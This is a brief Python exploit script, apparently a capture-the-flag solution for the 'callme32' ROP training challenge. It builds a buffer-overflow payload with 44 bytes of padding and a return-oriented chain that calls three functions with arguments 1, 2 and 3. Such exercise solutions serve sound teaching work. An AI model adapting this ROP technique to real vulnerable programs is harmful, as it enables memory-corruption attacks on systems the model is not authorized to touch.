#!/usr/bin/python

import struct
import os

callme1 = struct.pack("I", 0x080485c0)
callme2 = struct.pack("I", 0x08048620)
callme3 = struct.pack("I", 0x080485b0)
rop = struct.pack("I", 0x080488a9)
argv = struct.pack("< I I I", 1, 2, 3)

payload = "A"*44 + callme1 + rop + argv + callme2 + rop + argv + callme3 + rop + argv

callme = os.popen('./callme32', 'w')
callme.write(payload)



